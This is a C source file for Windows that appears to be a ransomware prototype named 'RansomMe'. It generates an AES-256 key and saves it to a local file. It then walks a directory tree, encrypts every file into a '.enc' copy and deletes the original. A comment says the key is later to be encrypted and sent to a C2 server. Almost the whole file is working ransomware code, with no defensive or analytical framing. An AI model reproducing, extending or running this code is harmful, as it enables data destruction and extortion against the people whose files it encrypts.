#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <strsafe.h>

#pragma comment(lib, "Advapi32.lib")

#define CHUNK_SIZE 4096


// I had to build my own strcat function to handle with the runtime exception thrown when
//      appending a string to a big enough string and overflowing the MaxSize
errno_t my_strcat_s(char* destinationStr, size_t MaxSize, const char* sourceStr) {
    if (strlen(destinationStr) + strlen(sourceStr) > MaxSize) {
        return -1;
    }
    else {
        return strcat_s(destinationStr, MaxSize, sourceStr);
    }
}

void PrintKey(HCRYPTPROV hCryptProv, HCRYPTKEY hKey) {
    DWORD keyBlobSize = 0;
    BYTE* keyBlob = NULL;
    FILE* file = NULL;
    const char* fileName = "C:\\Users\\Tamariz\\source\\repos\\RansomMe\\x64\\Debug\\key.bin";

    // Get the size of the key blob
    if (!CryptExportKey(hKey, 0, PLAINTEXTKEYBLOB, 0, NULL, &keyBlobSize)) {
        printf("Error: CryptExportKey failed. Error Code: %lu\n", GetLastError());
        return;
    }

    // Allocate memory for the key blob
    keyBlob = (BYTE*)malloc(keyBlobSize);
    if (!keyBlob) {
        printf("Error: Memory allocation failed.\n");
        return;
    }

    // Export the key into the blob
    if (!CryptExportKey(hKey, 0, PLAINTEXTKEYBLOB, 0, keyBlob, &keyBlobSize)) {
        printf("Error: CryptExportKey failed. Error Code: %lu\n", GetLastError());
        free(keyBlob);
        return;
    }

    file = fopen(fileName, "wb");
    if (!file) {
        printf("Error: Failed to open file %s for writing.\n", fileName);
        free(keyBlob);
        return;
    }

    // Write the key blob to the file
    if (fwrite(keyBlob, 1, keyBlobSize, file) != keyBlobSize) {
        printf("Error: Failed to write the full key blob to file.\n");
    }
    else {
        printf("Key successfully saved to %s\n", fileName);
    }

    // Clean up
    fclose(file);
    free(keyBlob);
}


BOOL EncryptMyFile(const char* inputFileName, const char* cryptoFileExt, HCRYPTKEY hKey) {
    HANDLE hInputFile = INVALID_HANDLE_VALUE;       // input file handler
    HANDLE hOutputFile = INVALID_HANDLE_VALUE;      // output file handler

    BYTE buffer[CHUNK_SIZE];                        // buffer to read from file, encrypt and write into file
    DWORD bytesRead = 0, bytesWritten = 0;          // number of bytes read/written return by CreateFile and CryptEncrypt
    BOOL finalChunk = FALSE;                        // flag to tell CryptEncrypt that it is the final chunk (smaller than the rest)
    BOOL success = FALSE;                           // flag to return success/failure

    char outputFileName[MAX_PATH] = "";             // output file name

    // the output file will be the original file plus the crypted extension appended
    strcpy_s(outputFileName, MAX_PATH, inputFileName);
    if (my_strcat_s(outputFileName, MAX_PATH, cryptoFileExt) != 0) {
        printf("Cannot append the crypted extension to file name %s.\n", outputFileName);
        goto cleanup;
    }

    // Open the input file
    hInputFile = CreateFileA(inputFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hInputFile == INVALID_HANDLE_VALUE) {
        printf("Error: Could not open input file %s. Error Code: %lu\n", inputFileName, GetLastError());
        goto cleanup;
    }

    // Open the output file
    hOutputFile = CreateFileA(outputFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOutputFile == INVALID_HANDLE_VALUE) {
        printf("Error: Could not open output file %s. Error Code: %lu\n", outputFileName, GetLastError());
        goto cleanup;
    }

    // Encrypt and write the file data in chunks
    while (ReadFile(hInputFile, buffer, CHUNK_SIZE, &bytesRead, NULL) && bytesRead > 0) {
        finalChunk = (bytesRead < CHUNK_SIZE);  // the final chunk will be smaller thant CHUNK_SIZE

        // Encrypt the chunk
        if (!CryptEncrypt(hKey, 0, finalChunk, 0, buffer, &bytesRead, CHUNK_SIZE)) {
            printf("Error: CryptEncrypt failed. Error Code: %lu\n", GetLastError());
            printf("Failure encrypting file %s\n", inputFileName);
            goto cleanup;
        }

        // Write the encrypted chunk to the output file
        if (!WriteFile(hOutputFile, buffer, bytesRead, &bytesWritten, NULL) || bytesWritten != bytesRead) {
            printf("Error: WriteFile failed. Error Code: %lu\n", GetLastError());
            printf("Failure writing to file %s\n", outputFileName);
            goto cleanup;
        }
    }

    success = TRUE;
    //    printf("\rFile %s encrypted successfully.", inputFileName);
    //    fflush(stdout);

cleanup:
    if (hInputFile != INVALID_HANDLE_VALUE) CloseHandle(hInputFile);
    if (hOutputFile != INVALID_HANDLE_VALUE) CloseHandle(hOutputFile);

    // Delete the input file only if the decryption was successful
    if (success == TRUE) {
        if (!DeleteFileA(inputFileName)) {
            printf("Error: Could not delete input file %s. Error Code: %lu\n", inputFileName, GetLastError());
        }
    }

    return success;
}

size_t EncryptAllFiles(char* targetDir, const char* cryptoFileExt, HCRYPTKEY hKey) {
    WIN32_FIND_DATAA foundFileData;          // WIN32_FIND_DATA containing the file/directory info
    HANDLE hFind = INVALID_HANDLE_VALUE;     // search handle to be used with findNextFile
    size_t fileCount = 0;                    // number of files found
    char targetSubDir[MAX_PATH] = "";        // temporary variable to store the subdir
    char findTargetDir[MAX_PATH] = "";       // just to add an asterisk to the end of the targetDir but without affecting the original string
    char fullFileName[MAX_PATH] = "";        // the full file name with path to pass to EncryptMyFile

    // if targetDir does not end with \ we will add it as it will be more convinient later
    if (targetDir[strlen(targetDir)] != '\\') {
        if (my_strcat_s(targetDir, MAX_PATH, "\\") != 0) {
            printf("Skipping directory %s. Cannot append '\\'. Name might be too long.\n", targetDir);
            return fileCount;
        }
    }
    // creating a copy of the dir and adding * to the end to pass it to the FindFirstFile function
    strcpy_s(findTargetDir, MAX_PATH, targetDir);
    if (my_strcat_s(findTargetDir, MAX_PATH, "*") != 0) {
        printf("Skipping directory %s. Cannot append '*'. Name might be too long.\n", targetDir);
        return fileCount;
    }

    // Find the first file in the directory.
    hFind = FindFirstFileA(findTargetDir, &foundFileData);

    if (INVALID_HANDLE_VALUE == hFind) {
        printf("Error: FindFirstFile failed. Error Code: %lu\n", GetLastError());
        return fileCount;
    }

    do {
        // check if it is a directory
        if (foundFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Skip "." and ".." directories
            if (strcmp(foundFileData.cFileName, ".") == 0 || strcmp(foundFileData.cFileName, "..") == 0) {
                continue;
            }
            // If it's a directory, append the folder name to the original target dir
            strcpy_s(targetSubDir, MAX_PATH, targetDir);
            if (my_strcat_s(targetSubDir, MAX_PATH, foundFileData.cFileName) != 0) {
                printf("Skipping directory %s. Cannot append subdir %s. Name might be too long.\n", targetDir, foundFileData.cFileName);
                continue;
            }

            // recursively call with every subfolder and add the number to the total files
            fileCount += EncryptAllFiles(targetSubDir, cryptoFileExt, hKey);
        }
        else {
            // If it's a file, encrypt it
            // let's create the full file name (with the full path)
            strcpy_s(fullFileName, MAX_PATH, targetDir);
            if (my_strcat_s(fullFileName, MAX_PATH, foundFileData.cFileName) != 0) {
                printf("Skipping file %s in dir %s. Name might be too long.\n", foundFileData.cFileName, targetDir);
                continue;
            }
            // now encrypt the file
            if (EncryptMyFile(fullFileName, cryptoFileExt, hKey)) {
                fileCount++;        // let's count the number of encrypted files, why not?
            }
        }
    } while (FindNextFileA(hFind, &foundFileData) != 0);

    // Close the search handle
    FindClose(hFind);
    return fileCount;
}

int main() {
    char targetDir[MAX_PATH] = "C:\\Users\\Tamariz\\Desktop\\Test\\a";
    //    char inputFileName[MAX_PATH] = "C:\\Users\\Tamariz\\source\\repos\\RansomMe\\x64\\Debug\\test.txt";
    //    char targetDir[MAX_PATH] = "C:\\Users\\Tamariz\\Desktop\\Test";
    const char* cryptoFileExt = ".enc";
    size_t fileNumber = 0;      // number of encrypted files

    //-------------------------------------------
    //     TIME
    FILETIME startTime, endTime;
    ULARGE_INTEGER start, end;

    // Get the start time
    GetSystemTimeAsFileTime(&startTime);
    start.LowPart = startTime.dwLowDateTime;
    start.HighPart = startTime.dwHighDateTime;
    //----------------------------------------------

/******* Initialize the crypto environment. Acquire context and generate a key ****************/
    HCRYPTPROV hCryptProv = 0;  // handler for the crypt provider
    HCRYPTKEY hKey = 0;         // handler for the key

    // Acquire a cryptographic provider context to use AES symmetric encryption
    if (!CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("Error: CryptAcquireContext failed. Error Code: %lu\n", GetLastError());
        return 0;
    }
    // Generate a key for the provider using the CALG_AES_256
    if (!CryptGenKey(hCryptProv, CALG_AES_256, CRYPT_EXPORTABLE, &hKey))
    {
        printf("Error: CryptGenKey failed. Error Code: %lu\n", GetLastError());
        return 0;
    }

    // print the key to a file (this will change to encrypt the key and send it to a C2 server
    PrintKey(hCryptProv, hKey);

    // encrypt a file
    fileNumber = EncryptAllFiles(targetDir, cryptoFileExt, hKey);
    printf("%zd files encrypted.\n", fileNumber);


    /*** Release the crypt handlers ***/
    // Release the session key. 
    if (hKey) {
        if (!(CryptDestroyKey(hKey))) {
            printf("Error during CryptDestroyKey!. Error code: %lu\n", GetLastError());
        }
    }
    // Release the provider handle. 
    if (hCryptProv) {
        if (!(CryptReleaseContext(hCryptProv, 0))) {
            printf("Error during CryptReleaseContext!. Error code: %lu\n", GetLastError());
        }
    }

    // Get the end time
    GetSystemTimeAsFileTime(&endTime);
    end.LowPart = endTime.dwLowDateTime;
    end.HighPart = endTime.dwHighDateTime;

    // Calculate the elapsed time in seconds
    ULONGLONG elapsedMilliseconds = (end.QuadPart - start.QuadPart) / 10000000;

    printf("Elapsed Time: %llu seconds\n", elapsedMilliseconds);

    return 0;
}
